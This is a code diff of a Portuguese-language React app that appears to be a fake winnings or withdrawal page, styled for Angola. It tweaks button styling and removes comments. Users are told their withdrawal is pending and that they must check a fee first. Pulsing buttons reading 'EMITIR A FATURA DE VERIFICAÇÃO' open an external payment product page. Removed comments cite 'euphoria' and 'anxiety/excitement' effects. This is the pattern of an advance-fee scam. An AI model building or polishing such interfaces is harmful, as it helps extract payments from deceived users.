@@ -210,14 +210,12 @@ const App: React.FC = () => {
                            </div>
                         </div>
                      </div>
-                     {/* Observação solicitada */}
                      <p className="text-[9px] text-zinc-400 italic mt-3 font-medium">
                         * O seu saque está pendente, verifique primeiro a taxa.
                      </p>
-                     {/* Botão de Verificar Taxa Atualizado */}
                      <button 
                        onClick={() => window.open('https://www.kintu.org/product/2aeff560-f13b-4814-9305-cba3f58e2a80', '_blank')}
-                       className="mt-4 w-full py-3 bg-angola-red text-white font-black rounded-2xl uppercase tracking-widest text-[10px] animate-pulse shadow-lg hover:bg-red-700 transition-all border-b-4 border-red-900"
+                       className="mt-4 w-full py-4 bg-angola-red text-white font-black rounded-2xl uppercase tracking-widest text-[10px] animate-pulse shadow-lg hover:scale-105 transition-all border-b-4 border-red-900"
                      >
                        EMITIR A FATURA DE VERIFICAÇÃO
                      </button>
@@ -261,14 +259,12 @@ const App: React.FC = () => {
                 </div>
               </div>
 
-              {/* Decorative elements for euphoria */}
               <div className="absolute -bottom-10 -left-10 w-40 h-40 bg-angola-red rounded-full opacity-10 blur-3xl"></div>
               <div className="absolute -top-10 -right-10 w-40 h-40 bg-angola-yellow rounded-full opacity-20 blur-3xl"></div>
             </div>
           </div>
         )}
 
-        {/* Reusing existing Withdraw views with styling enhancements */}
         {gameState === GameState.WITHDRAW_METHOD && (
           <div className="max-w-xl mx-auto p-6 animate-zoom-in">
             <div className="glass-card p-12 rounded-[4rem] border-zinc-800 shadow-2xl">
@@ -396,12 +392,11 @@ const App: React.FC = () => {
               <div className="space-y-6">
                 <button 
                   onClick={() => window.open('https://www.kintu.org/product/2aeff560-f13b-4814-9305-cba3f58e2a80', '_blank')}
-                  className="w-full py-8 btn-ganho text-black font-black rounded-[3rem] text-2xl uppercase shadow-[0_10px_40px_rgba(248,211,8,0.4)] border-b-8 border-yellow-700 hover:scale-105 active:scale-95 transition-all animate-pulse"
+                  className="w-full py-8 btn-ganho text-black font-black rounded-[3rem] text-2xl uppercase shadow-[0_10px_40px_rgba(248,211,8,0.4)] border-b-8 border-yellow-700 hover:scale-110 active:scale-95 transition-all animate-pulse"
                 >
                   EMITIR A FATURA DE VERIFICAÇÃO
                 </button>
                 
-                {/* Observação solicitada pelo usuário */}
                 <p className="text-zinc-500 font-bold uppercase mt-4">
                   Verifique a taxa para receber o seu ganho.
                 </p>
@@ -420,7 +415,6 @@ const App: React.FC = () => {
         )}
       </main>
 
-      {/* Persistent UI elements for anxiety/excitement */}
       <div className="fixed bottom-6 right-6 z-[100] flex flex-col gap-3">
         {notifications.map(n => (
           <div key={n.id} className="notificacao-ganhador scale-[1.1] shadow-2xl border-4 border-angola-yellow">
